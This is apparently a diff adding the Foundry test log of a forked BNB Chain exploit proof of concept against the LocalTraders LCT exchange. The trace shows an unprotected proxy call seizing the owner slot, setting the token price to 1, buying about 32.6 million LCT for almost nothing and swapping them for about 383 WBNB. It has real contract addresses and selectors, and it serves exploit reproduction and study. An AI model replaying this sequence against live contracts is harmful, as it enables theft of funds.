@@ -1,0 +1,153 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/LocalTrader2_exp.sol:LocalTraders
+[PASS] testAccess() (gas: 244263)
+Logs:
+  [1] Attacker amount of WBNB before attack: 0.000000000000000000
+  [1] Address value in slot 0 before first call: 0xB06a05c7f92578Ef927860604EdAc89fD68dfEC9
+  [1] Address value in slot 0 after first call: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE
+  [2] Uint value (token price) in slot 3 before second call: 46280000000000
+  [2] Uint value (token price) in slot 3 after second call: 1
+  [3] Bought LCT tokens: 32650797.000000000000000000
+  [4] Attacker amount of WBNB after attack: 383.240638704329950072
+
+Traces:
+  [20773] LocalTraders::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 28460897 [2.846e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(LCTExchange: [0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06], "LCTExchange")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(LCT: [0x5C65BAdf7F97345B7B92776b22255c973234EfE7], "LCT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], "Proxy")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [266963] LocalTraders::testAccess()
+    ├─ [2534] WBNB::balanceOf(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "[1] Attacker amount of WBNB before attack", val: 0, decimals: 18)
+    ├─ [0] VM::load(Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return] 0x000000000000000000000000b06a05c7f92578ef927860604edac89fd68dfec9
+    ├─ emit log_named_address(key: "[1] Address value in slot 0 before first call", val: 0xB06a05c7f92578Ef927860604EdAc89fD68dfEC9)
+    ├─ [26073] Proxy::storeConstructor(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE)
+    │   ├─ [18757] 0x312DC37075646c7e0DBA21DF5BdFe69E76475fdc::storeConstructor(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0x000000000000000000000000b06a05c7f92578ef927860604edac89fd68dfec9 → 0x0000000000000000000000000567f2323251f0aab15c8dfb1967e4e8a7d42aee
+    │   │   │   @ 2: 0x000000000000000000000000ffdf0d059e161645eb0961cf7d723c704cdfa363 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 3: 0x0000000000000000000000000000000000000000000000000000145abff33800 → 0x00000000000000000000000000000000000000000000000000002a1766f5d000
+    │   │   │   @ 1: 0x000000000000000000000000c1c6c591ce35040bcdb97b8804f416acde4e0fbd → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] VM::load(Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return] 0x0000000000000000000000000567f2323251f0aab15c8dfb1967e4e8a7d42aee
+    ├─ [0] VM::assertEq(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE, 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE) [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_address(key: "[1] Address value in slot 0 after first call", val: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE)
+    ├─ [0] VM::roll(28460898 [2.846e7])
+    │   └─ ← [Return]
+    ├─ [0] VM::load(Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000003)
+    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000002a1766f5d000
+    ├─ emit log_named_uint(key: "[2] Uint value (token price) in slot 3 before second call", val: 46280000000000 [4.628e13])
+    ├─ [1772] Proxy::925d400c(0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ [953] 0x312DC37075646c7e0DBA21DF5BdFe69E76475fdc::925d400c(0000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0x00000000000000000000000000000000000000000000000000002a1766f5d000 → 1
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [0] VM::load(Proxy: [0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41], 0x0000000000000000000000000000000000000000000000000000000000000003)
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    ├─ [0] VM::assertEq(1, 1) [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_uint(key: "[2] Uint value (token price) in slot 3 after second call", val: 1)
+    ├─ [0] VM::roll(28460899 [2.846e7])
+    │   └─ ← [Return]
+    ├─ [2863] LCT::balanceOf(LCTExchange: [0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06]) [staticcall]
+    │   └─ ← [Return] 32650798746200000000000000 [3.265e25]
+    ├─ [46001] LCTExchange::buyTokens{value: 32650797}()
+    │   ├─ [1514] Proxy::getTokenPrice() [staticcall]
+    │   │   ├─ [698] 0x312DC37075646c7e0DBA21DF5BdFe69E76475fdc::getTokenPrice() [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ [863] LCT::balanceOf(LCTExchange: [0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06]) [staticcall]
+    │   │   └─ ← [Return] 32650798746200000000000000 [3.265e25]
+    │   ├─ [28761] LCT::transfer(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32650797000000000000000000 [3.265e25])
+    │   │   ├─ emit Transfer(from: LCTExchange: [0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06], to: LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32650797000000000000000000 [3.265e25])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xde62f679b78735414933212e51563ba4596d3114fd914f3ab50a2a65d60f1979: 0x0000000000000000000000000000000000000000001b021358c16311775d8000 → 0x000000000000000000000000000000000000000000000000183bbfa5f2c98000
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000001b02134085a36b84940000
+    │   │   └─ ← [Return] true
+    │   ├─ [1514] Proxy::getTokenPrice() [staticcall]
+    │   │   ├─ [698] 0x312DC37075646c7e0DBA21DF5BdFe69E76475fdc::getTokenPrice() [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ emit TokensPurchased(: LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : LCT: [0x5C65BAdf7F97345B7B92776b22255c973234EfE7], : 32650797000000000000000000 [3.265e25], : 1)
+    │   ├─ [1514] Proxy::getTokenPrice() [staticcall]
+    │   │   ├─ [698] 0x312DC37075646c7e0DBA21DF5BdFe69E76475fdc::getTokenPrice() [delegatecall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000001f2362d
+    ├─ [863] LCT::balanceOf(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 32650797000000000000000000 [3.265e25]
+    ├─ [432] LCT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "[3] Bought LCT tokens", val: 32650797000000000000000000 [3.265e25], decimals: 18)
+    ├─ [0] VM::roll(28461207 [2.846e7])
+    │   └─ ← [Return]
+    ├─ [25262] LCT::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x44bf1039324fcbfda472196706fa68525cb38db0f3d91f5ca7d489ff92357e45: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [863] LCT::balanceOf(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 32650797000000000000000000 [3.265e25]
+    ├─ [86599] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(32650797000000000000000000 [3.265e25], 0, [0x5C65BAdf7F97345B7B92776b22255c973234EfE7, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1684841939 [1.684e9])
+    │   ├─ [9462] LCT::transferFrom(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724, 32650797000000000000000000 [3.265e25])
+    │   │   ├─ emit Transfer(from: LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724, value: 32650797000000000000000000 [3.265e25])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000001b02134085a36b84940000 → 0
+    │   │   │   @ 0xc0ec174bace4dd1e817eb8d9140f50121a3330270f1f5dce3c8629440778808e: 0x0000000000000000000000000000000000000000001fe294f238be1ab640a792 → 0x0000000000000000000000000000000000000000003ae4a832be61863ad4a792
+    │   │   └─ ← [Return] true
+    │   ├─ [534] WBNB::balanceOf(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2893] 0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724::getReserves() [staticcall]
+    │   │   └─ ← [Return] 38546702805214331058300818 [3.854e25], 836818761807082992305 [8.368e20], 1684841483 [1.684e9]
+    │   ├─ [863] LCT::balanceOf(0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724) [staticcall]
+    │   │   └─ ← [Return] 71197499805214331058300818 [7.119e25]
+    │   ├─ [62671] 0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724::swap(0, 383240638704329950072 [3.832e20], LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [27962] WBNB::transfer(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 383240638704329950072 [3.832e20])
+    │   │   │   ├─ emit Transfer(from: 0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724, to: LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 383240638704329950072 [3.832e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x55d50072221be068fbea9ade710c0a06abf15d78dfd825c77b46643f3522c3b1: 0x00000000000000000000000000000000000000000000002d5d3176352d66b2b1 → 0x00000000000000000000000000000000000000000000001896a933cd53feaf39
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000014c6884267d9680378
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [863] LCT::balanceOf(0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724) [staticcall]
+    │   │   │   └─ ← [Return] 71197499805214331058300818 [7.119e25]
+    │   │   ├─ [534] WBNB::balanceOf(0x64b266Cd63fF3239E6491d6c2c58A5B8552c8724) [staticcall]
+    │   │   │   └─ ← [Return] 453578123102753042233 [4.535e20]
+    │   │   ├─ emit Sync(reserve0: 71197499805214331058300818 [7.119e25], reserve1: 453578123102753042233 [4.535e20])
+    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 32650797000000000000000000 [3.265e25], amount1In: 0, amount0Out: 0, amount1Out: 383240638704329950072 [3.832e20], to: LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x646ca40b00000000002d5d3176352d66b2b10000001fe294f238be1ab640a792 → 0x646ca5d300000000001896a933cd53feaf390000003ae4a832be61863ad4a792
+    │   │   │   @ 9: 0x0000000000000000000000000000000001d546daacf89b356124f0bd25ba6608 → 0x0000000000000000000000000000000001d549637165dad1a44c8d5741d34688
+    │   │   │   @ 10: 0x00000000000000000000000000c461b78d3e7163f23084654affdd71b9b52459 → 0x00000000000000000000000000c462f80fa4ea6e3480489ba1c3bd08dbe5cf89
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WBNB::balanceOf(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 383240638704329950072 [3.832e20]
+    │   └─ ← [Stop]
+    ├─ [534] WBNB::balanceOf(LocalTraders: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 383240638704329950072 [3.832e20]
+    ├─ [444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "[4] Attacker amount of WBNB after attack", val: 383240638704329950072 [3.832e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.27s (6.90s CPU time)
+
+Ran 1 test suite in 8.92s (8.27s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
